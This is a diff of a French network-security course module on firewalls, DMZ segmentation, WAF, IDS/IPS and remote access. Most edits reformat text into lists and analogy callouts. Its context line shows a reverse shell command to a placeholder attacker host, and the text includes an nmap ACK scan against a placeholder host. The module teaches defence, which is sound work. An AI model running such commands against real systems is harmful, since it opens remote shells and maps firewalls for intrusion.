@@ -48,7 +48,13 @@ bash -i >& /dev/tcp/<ATTACKER_IP>/443 0>&1
 
 Aucune règle sortante ne l'arrête, car tout le trafic sortant en 443 est autorisé « pour les mises à jour ». Depuis le serveur web, il scanne le LAN : la règle `any any` laisse tout passer. SMB, LDAP et Kerberos répondent. La compromission du domaine est une question d'heures.
 
-Les protections étaient toutes présentes sur le papier : pare-feu, DMZ, WAF devant le portail, IDS sur le trunk. Une seule règle les a toutes neutralisées. Le WAF ne voit pas un upload légitime en apparence, la DMZ ne cloisonne rien, et l'IDS génère des alertes que personne ne lit. La suite du module reprend chaque couche pour montrer comment elle se configure et comment elle se contourne.
+Les protections étaient toutes présentes sur le papier : pare-feu, DMZ, WAF devant le portail, IDS sur le trunk. Une seule règle les a toutes neutralisées :
+
+- le WAF ne voit pas un upload légitime en apparence ;
+- la DMZ ne cloisonne rien ;
+- l'IDS génère des alertes que personne ne lit.
+
+La suite du module reprend chaque couche pour montrer comment elle se configure et comment elle se contourne.
 
 ---
 
@@ -87,7 +93,12 @@ nmap -Pn -sA -p 1-1024 <HOST>
 
 Un port « unfiltered » (RST reçu) prouve que le paquet ACK a traversé le filtre. Sur un port que les règles n'ouvrent pas, c'est le signe qu'aucun état n'est suivi : l'attaquant cartographie les règles et sait qu'il peut forger du trafic qui ressemble à une réponse.
 
-Un filtre **stateful** mémorise chaque flux dans une table (`conntrack`*). Une réponse n'est acceptée que si elle correspond à une connexion initiée dans le bon sens. Un ACK isolé ne correspond à aucune connexion connue. Sous Linux, il n'est classé `INVALID` et jeté que si `net.netfilter.nf_conntrack_tcp_loose` vaut 0, ou si une règle exige le flag SYN pour toute nouvelle connexion. Avec la valeur par défaut (1), il est classé `NEW` et accepté par une règle d'ouverture qui ne vérifie pas l'état, comme `tcp dport { 80, 443 } accept` ci-dessous.
+Un filtre **stateful** mémorise chaque flux dans une table (`conntrack`*). Une réponse n'est acceptée que si elle correspond à une connexion initiée dans le bon sens.
+
+> 🛂 **Analogie : le contrôle à la frontière.** Un filtre stateless ressemble à un douanier qui laisse entrer quiconque affirme « je rentre de voyage », sans rien vérifier. Un filtre stateful tient un registre des sorties et ne laisse rentrer que ceux qu'il a vus partir. Limite : sous Linux, ce registre n'est pas toujours appliqué strictement, comme le montre la suite.
+{: .callout .callout-analogie}
+
+Que devient alors un ACK isolé ? Il ne correspond à aucune connexion connue. Pourtant, sous Linux, il n'est classé `INVALID` et jeté que si `net.netfilter.nf_conntrack_tcp_loose` vaut 0, ou si une règle exige le flag SYN pour toute nouvelle connexion. Avec la valeur par défaut (1), il est classé `NEW` et accepté par une règle d'ouverture qui ne vérifie pas l'état, comme `tcp dport { 80, 443 } accept` ci-dessous.
 
 \* `conntrack` : sous-système du noyau Linux qui garde l'état de chaque flux (NEW, ESTABLISHED, RELATED) dans une table de taille bornée.
 
@@ -96,7 +107,10 @@ Un filtre **stateful** mémorise chaque flux dans une table (`conntrack`*). Une 
 
 ### Une politique par défaut qui refuse
 
-Deux règles guident tout le reste : la politique par défaut est `drop`, et on n'ouvre que ce qu'on sait justifier. Voici le pare-feu d'un serveur web en DMZ (nftables, famille `inet` pour couvrir IPv4 et IPv6 d'un coup) :
+> 💡 **À retenir.** Deux règles guident tout le reste : la politique par défaut est `drop`, et on n'ouvre que ce qu'on sait justifier.
+{: .callout .callout-important}
+
+Voici le pare-feu d'un serveur web en DMZ (nftables, famille `inet` pour couvrir IPv4 et IPv6 d'un coup) :
 
 ```nft
 table inet filter {
@@ -237,7 +251,7 @@ http_access allow allowed_dst
 http_access deny all
 ```
 
-Sans inspection TLS (coûteuse et lourde juridiquement), il ne voit que le nom de domaine demandé. C'est suffisant pour bloquer `<ATTACKER_IP>:443` mais pas un attaquant qui héberge son serveur de contrôle sur un domaine déjà autorisé. Limite à connaître.
+Sans inspection TLS (coûteuse et lourde juridiquement), il ne voit que le nom de domaine demandé. C'est suffisant pour bloquer `<ATTACKER_IP>:443`, mais pas un attaquant qui héberge son serveur de contrôle sur un domaine déjà autorisé : c'est une limite à connaître.
 
 ### Reverse proxy et WAF
 
@@ -268,6 +282,9 @@ Les chemins et directives dépendent de la distribution et de la version du modu
 
 Un IDS (Intrusion Detection System) observe une copie du trafic (port miroir, TAP) et alerte. Un IPS (Intrusion Prevention System) est placé en ligne et peut jeter les paquets. Suricata et Snort sont les références open source.
 
+> 🎥 **Analogie : la caméra et le portique.** L'IDS est une caméra : il voit passer et signale, sans rien arrêter. L'IPS est un portique : il peut bloquer, mais un mauvais réglage bloque aussi les passants légitimes.
+{: .callout .callout-analogie}
+
 Une règle simple qui détecte une rafale de connexions SSH depuis une même source :
 
 ```
@@ -285,7 +302,9 @@ Les décisions pratiques :
 
 ## Protection des accès distants
 
-Un accès distant, c'est une porte qui reste ouverte sur Internet par définition. Les attaquants le savent : les équipements VPN et pare-feu en bordure sont des cibles privilégiées. CVE-2018-13379 (lecture de fichiers sur FortiOS SSL VPN) et CVE-2024-3400 (injection de commande sur PAN-OS GlobalProtect) ont été exploitées activement. Le pare-feu protège le réseau, mais lui-même est exposé.
+Un accès distant, c'est une porte qui reste ouverte sur Internet par définition. Les attaquants le savent : les équipements VPN et pare-feu en bordure sont des cibles privilégiées.
+
+CVE-2018-13379 (lecture de fichiers sur FortiOS SSL VPN) et CVE-2024-3400 (injection de commande sur PAN-OS GlobalProtect) ont été exploitées activement. Le pare-feu protège le réseau, mais il est lui-même exposé.
 
 Ce qui tient en production :
 
@@ -447,7 +466,12 @@ Le compromis : le gain en sécurité est immédiat, le risque est de couper un f
 
 ## Résumé
 
-Un pare-feu stateful en `default-deny`, avec filtrage sortant, bloque la majorité des attaques opportunistes et casse la phase d'appel vers l'extérieur d'une compromission. La segmentation DMZ / application / données ne vaut que si chaque flux inter-zone est un couple IP:port précis, sinon elle ne limite pas le mouvement latéral. Le reverse proxy et le WAF filtrent les attaques applicatives, à condition que l'origine ne soit pas joignable en direct. L'IDS/IPS apporte de la visibilité, avec un déploiement progressif (alerte avant blocage) et une vue limitée sur le trafic chiffré. Les accès distants passent par VPN avec MFA ou un bastion, et les équipements de bordure se patchent vite. À surveiller en continu : les règles trop larges ou dormantes, les deny sortants des serveurs, les modifications hors changement, et la saturation de `conntrack`.
+- Un pare-feu stateful en `default-deny`, avec filtrage sortant, bloque la majorité des attaques opportunistes et casse la phase d'appel vers l'extérieur d'une compromission.
+- La segmentation DMZ / application / données ne vaut que si chaque flux inter-zone est un couple IP:port précis, sinon elle ne limite pas le mouvement latéral.
+- Le reverse proxy et le WAF filtrent les attaques applicatives, à condition que l'origine ne soit pas joignable en direct.
+- L'IDS/IPS apporte de la visibilité, avec un déploiement progressif (alerte avant blocage) et une vue limitée sur le trafic chiffré.
+- Les accès distants passent par VPN avec MFA ou un bastion, et les équipements de bordure se patchent vite.
+- À surveiller en continu : les règles trop larges ou dormantes, les deny sortants des serveurs, les modifications hors changement, et la saturation de `conntrack`.
 
 <!-- snippet
 id: firewall_stateful_vs_stateless_ack_scan
